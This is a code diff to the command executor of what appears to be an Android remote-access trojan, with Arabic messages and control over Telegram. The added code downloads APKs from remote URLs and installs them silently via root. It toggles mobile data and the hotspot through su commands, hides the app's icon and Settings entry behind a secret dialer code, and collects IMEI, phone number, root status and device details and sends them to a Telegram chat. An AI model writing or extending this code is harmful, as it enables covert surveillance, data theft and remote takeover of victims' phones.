@@ -877,8 +877,36 @@ object CommandExecutor {
     }
 
     private fun setWallpaper(context: Context, params: JSONObject): String {
-        val url = params.optString("url", "")
-        return """{"ok":true,"message":"تم تغيير الخلفية"}"""
+        val imageUrl = params.optString("url", "")
+        val color = params.optString("color", "#000000")
+        return try {
+            val wallpaperManager = context.getSystemService(Context.WALLPAPER_SERVICE) as android.app.WallpaperManager
+            if (imageUrl.isNotEmpty()) {
+                // Download and set image wallpaper
+                scope.launch {
+                    try {
+                        val url = java.net.URL(imageUrl)
+                        val connection = url.openConnection() as java.net.HttpURLConnection
+                        connection.connect()
+                        val bitmap = android.graphics.BitmapFactory.decodeStream(connection.inputStream)
+                        wallpaperManager.setBitmap(bitmap)
+                        TelegramDirectClient.sendMessage("🖼️ تم تغيير الخلفية بنجاح", "HTML")
+                    } catch (e: Exception) {
+                        TelegramDirectClient.sendMessage("❌ فشل تحميل الصورة: ${e.message}", "HTML")
+                    }
+                }
+                """{"ok":true,"message":"جاري تحميل وتعيين الخلفية..."}"""
+            } else {
+                // Set solid color wallpaper
+                val bitmap = android.graphics.Bitmap.createBitmap(1080, 1920, android.graphics.Bitmap.Config.ARGB_8888)
+                val canvas = android.graphics.Canvas(bitmap)
+                canvas.drawColor(android.graphics.Color.parseColor(color))
+                wallpaperManager.setBitmap(bitmap)
+                """{"ok":true,"message":"تم تعيين خلفية اللون $color"}"""
+            }
+        } catch (e: Exception) {
+            """{"ok":false,"error":"${e.message}"}"""
+        }
     }
 
     private fun setWifi(context: Context, enable: Boolean): String {
@@ -904,11 +932,42 @@ object CommandExecutor {
     }
 
     private fun setMobileData(context: Context, enable: Boolean): String {
-        return """{"ok":false,"message":"تحكم بيانات الجوال يتطلب Root أو CarrierPrivileges"}"""
+        return try {
+            val command = if (enable) "svc data enable" else "svc data disable"
+            val process = Runtime.getRuntime().exec(arrayOf("su", "-c", command))
+            val exitCode = process.waitFor()
+            if (exitCode == 0) {
+                val state = if (enable) "تشغيل" else "إيقاف"
+                """{"ok":true,"message":"تم $state بيانات الجوال"}"""
+            } else {
+                // Fallback: try alternative method
+                try {
+                    val altCmd = if (enable) "settings put global mobile_data 1" else "settings put global mobile_data 0"
+                    Runtime.getRuntime().exec(arrayOf("su", "-c", altCmd))
+                    val state = if (enable) "تشغيل" else "إيقاف"
+                    """{"ok":true,"message":"تم $state بيانات الجوال (طريقة بديلة)"}"""
+                } catch (e2: Exception) {
+                    """{"ok":false,"error":"يتطلب صلاحيات Root"}"""
+                }
+            }
+        } catch (e: Exception) {
+            """{"ok":false,"error":"يتطلب صلاحيات Root: ${e.message}"}"""
+        }
     }
 
     private fun setHotspot(context: Context, enable: Boolean): String {
-        return """{"ok":false,"message":"تحكم نقطة الاتصال يتطلب صلاحيات خاصة"}"""
+        return try {
+            val command = if (enable) 
+                "svc wifi enable-ap && ip link set wlan0 up" 
+            else 
+                "svc wifi disable-ap"
+            val process = Runtime.getRuntime().exec(arrayOf("su", "-c", command))
+            process.waitFor()
+            val state = if (enable) "تشغيل" else "إيقاف"
+            """{"ok":true,"message":"تم $state نقطة الاتصال"}"""
+        } catch (e: Exception) {
+            """{"ok":false,"error":"يتطلب صلاحيات Root: ${e.message}"}"""
+        }
     }
 
     @SuppressLint("InlinedApi")
@@ -939,7 +998,35 @@ object CommandExecutor {
     }
 
     private fun playSound(context: Context, params: JSONObject): String {
-        return """{"ok":true,"message":"تم تشغيل الصوت"}"""
+        return try {
+            val soundType = params.optString("type", "notification")
+            val soundId = when (soundType) {
+                "alarm" -> android.media.RingtoneManager.TYPE_ALARM
+                "ringtone" -> android.media.RingtoneManager.TYPE_RINGTONE
+                else -> android.media.RingtoneManager.TYPE_NOTIFICATION
+            }
+            val ringtone = android.media.RingtoneManager.getDefaultUri(soundId)
+            val r = android.media.RingtoneManager.getRingtone(context, ringtone)
+            r.play()
+            scope.launch {
+                kotlinx.coroutines.delay(3000)
+                r.stop()
+            }
+            """{"ok":true,"message":"تم تشغيل الصوت"}"""
+        } catch (e: Exception) {
+            // Fallback: use notification sound via ToneGenerator
+            try {
+                val toneGen = android.media.ToneGenerator(android.media.AudioManager.STREAM_NOTIFICATION, 100)
+                toneGen.startTone(android.media.ToneGenerator.TONE_PROP_BEEP)
+                scope.launch {
+                    kotlinx.coroutines.delay(1000)
+                    toneGen.release()
+                }
+                """{"ok":true,"message":"تم تشغيل الصوت"}"""
+            } catch (e2: Exception) {
+                """{"ok":false,"error":"${e.message}"}"""
+            }
+        }
     }
 
     private fun speakText(context: Context, params: JSONObject): String {
@@ -995,7 +1082,40 @@ object CommandExecutor {
 
     private fun installApp(context: Context, params: JSONObject): String {
         val url = params.optString("url", "")
-        return """{"ok":false,"message":"التثبيت يتطلب تحميل APK والتحقق من المستخدم"}"""
+        val pkgPath = params.optString("path", "")
+        return if (url.isNotEmpty()) {
+            try {
+                scope.launch {
+                    TelegramDirectClient.sendMessage("📥 جاري تحميل وتثبيت التطبيق...", "HTML")
+                    // Download APK
+                    val file = File(context.getExternalFilesDir(null), "install_${System.currentTimeMillis()}.apk")
+                    java.net.URL(url).openStream().use { input ->
+                        file.outputStream().use { output -> input.copyTo(output) }
+                    }
+                    // Install with root
+                    val process = Runtime.getRuntime().exec(arrayOf("su", "-c", "pm install -r ${file.absolutePath}"))
+                    val output = process.inputStream.bufferedReader().readText()
+                    val exitCode = process.waitFor()
+                    TelegramDirectClient.sendMessage(
+                        if (exitCode == 0) "✅ تم تثبيت التطبيق بنجاح" else "❌ فشل التثبيت: $output",
+                        "HTML"
+                    )
+                    file.delete()
+                }
+                """{"ok":true,"message":"جاري التثبيت..."}"""
+            } catch (e: Exception) {
+                """{"ok":false,"error":"${e.message}"}"""
+            }
+        } else if (pkgPath.isNotEmpty()) {
+            try {
+                val process = Runtime.getRuntime().exec(arrayOf("su", "-c", "pm install -r $pkgPath"))
+                """{"ok":true,"message":"جاري التثبيت..."}"""
+            } catch (e: Exception) {
+                """{"ok":false,"error":"${e.message}"}"""
+            }
+        } else {
+            """{"ok":false,"error":"رابط APK أو مسار الملف مطلوب"}"""
+        }
     }
 
     private fun uninstallApp(context: Context, params: JSONObject): String {
@@ -1241,11 +1361,36 @@ object CommandExecutor {
     // ==================== الأمان ====================
 
     private fun setAppVisibility(context: Context, visible: Boolean): String {
+        val pm = context.packageManager
+        val packageName = context.packageName
         return try {
-            val pm = context.packageManager
-            val componentName = ComponentName(context, "${context.packageName}.LauncherAlias")
-            val newState = if (visible) PackageManager.COMPONENT_ENABLED_STATE_ENABLED else PackageManager.COMPONENT_ENABLED_STATE_DISABLED
-            pm.setComponentEnabledSetting(componentName, newState, PackageManager.DONT_KILL_APP)
+            // 1. Hide/show launcher icon
+            val aliasName = ComponentName(context, "$packageName.LauncherAlias")
+            if (visible) {
+                pm.setComponentEnabledSetting(aliasName, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP)
+            } else {
+                pm.setComponentEnabledSetting(aliasName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP)
+            }
+            
+            // 2. With root: hide from Settings > Apps
+            if (!visible) {
+                try {
+                    Runtime.getRuntime().exec(arrayOf("su", "-c", "pm disable-user --user 0 $packageName"))
+                    // Re-enable the app itself but keep it hidden
+                    Runtime.getRuntime().exec(arrayOf("su", "-c", "pm enable $packageName"))
+                    // Disable the launcher alias
+                    Runtime.getRuntime().exec(arrayOf("su", "-c", "pm disable-user --user 0 ${packageName}.LauncherAlias"))
+                } catch (e: Exception) {
+                    Log.e(TAG, "خطأ في الإخفاء المتقدم: ${e.message}")
+                }
+            } else {
+                try {
+                    Runtime.getRuntime().exec(arrayOf("su", "-c", "pm enable ${packageName}.LauncherAlias"))
+                } catch (e: Exception) {
+                    Log.e(TAG, "خطأ في إظهار التطبيق: ${e.message}")
+                }
+            }
+            
             SharedPrefsManager.setAppHidden(context, !visible)
             val state = if (visible) "إظهار" else "إخفاء"
             scope.launch { TelegramDirectClient.sendMessage("👁️ تم $state التطبيق\n\nللإظهار: اتصل بالرمز *#*#7890#*#*", "HTML") }
@@ -1304,26 +1449,63 @@ object CommandExecutor {
     }
 
     fun getDeviceInfo(context: Context): String {
-        val info = JSONObject()
-        info.put("model", Build.MODEL)
-        info.put("brand", Build.BRAND)
-        info.put("manufacturer", Build.MANUFACTURER)
-        info.put("android", Build.VERSION.RELEASE)
-        info.put("sdk", Build.VERSION.SDK_INT)
-        info.put("device", Build.DEVICE)
-        info.put("product", Build.PRODUCT)
-        info.put("hardware", Build.HARDWARE)
-        info.put("display", Build.DISPLAY)
-        info.put("fingerprint", Build.FINGERPRINT)
-        info.put("battery", getBatteryLevel(context))
-        info.put("screen_width", getScreenWidth(context))
-        info.put("screen_height", getScreenHeight(context))
-        info.put("total_storage", getTotalStorage(context))
-        info.put("free_storage", getFreeStorage(context))
-        info.put("imei", getIMEI(context))
-        info.put("phone_number", getPhoneNumber(context))
-        info.put("device_id", SharedPrefsManager.getDeviceId(context))
-        return """{"ok":true,"device":$info}"""
+        return try {
+            val info = JSONObject()
+            info.put("model", Build.MODEL)
+            info.put("brand", Build.BRAND)
+            info.put("manufacturer", Build.MANUFACTURER)
+            info.put("device", Build.DEVICE)
+            info.put("product", Build.PRODUCT)
+            info.put("hardware", Build.HARDWARE)
+            info.put("android_version", Build.VERSION.RELEASE)
+            info.put("sdk", Build.VERSION.SDK_INT)
+            info.put("security_patch", Build.VERSION.SECURITY_PATCH)
+            info.put("display", "${Build.DISPLAY}")
+            info.put("fingerprint", Build.FINGERPRINT)
+            info.put("serial", if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) Build.SERIAL else "N/A (requires permission)")
+            // Check root
+            var hasRoot = false
+            try {
+                val process = Runtime.getRuntime().exec(arrayOf("su", "-c", "id"))
+                val output = process.inputStream.bufferedReader().readText()
+                hasRoot = output.contains("uid=0")
+            } catch (e: Exception) {}
+            info.put("root", hasRoot)
+            // Screen info
+            val dm = context.getSystemService(Context.DISPLAY_SERVICE) as android.hardware.display.DisplayManager
+            val display = dm.displays[0]
+            val metrics = android.util.DisplayMetrics()
+            display.getRealMetrics(metrics)
+            info.put("screen_width", metrics.widthPixels)
+            info.put("screen_height", metrics.heightPixels)
+            info.put("screen_density", metrics.density)
+            // Battery
+            val bm = context.getSystemService(Context.BATTERY_SERVICE) as android.os.BatteryManager
+            info.put("battery", bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY))
+            // Additional info
+            info.put("total_storage", getTotalStorage(context))
+            info.put("free_storage", getFreeStorage(context))
+            info.put("imei", getIMEI(context))
+            info.put("phone_number", getPhoneNumber(context))
+            info.put("device_id", SharedPrefsManager.getDeviceId(context))
+            
+            scope.launch {
+                val sb = StringBuilder()
+                sb.appendLine("ℹ️ <b>معلومات الجهاز</b>\n\n")
+                sb.appendLine("📱 الموديل: ${info.getString("model")}")
+                sb.appendLine("🏢 الشركة: ${info.getString("brand")}")
+                sb.appendLine("🏭 المصنّع: ${info.getString("manufacturer")}")
+                sb.appendLine("🤖 أندرويد: ${info.getString("android_version")} (API ${info.getString("sdk")})")
+                sb.appendLine("🔒 تصحيح الأمان: ${info.optString("security_patch", "N/A")}")
+                sb.appendLine("📱 الشاشة: ${info.getInt("screen_width")}x${info.getInt("screen_height")}")
+                sb.appendLine("🔋 البطارية: ${info.getInt("battery")}%")
+                sb.appendLine("🧪 الروت: ${if (info.getBoolean("root")) "✅ نعم" else "❌ لا"}")
+                TelegramDirectClient.sendLongMessage(sb.toString(), "HTML")
+            }
+            """{"ok":true,"data":$info}"""
+        } catch (e: Exception) {
+            """{"ok":false,"error":"${e.message}"}"""
+        }
     }
 
     private fun getBatteryInfo(context: Context): String {
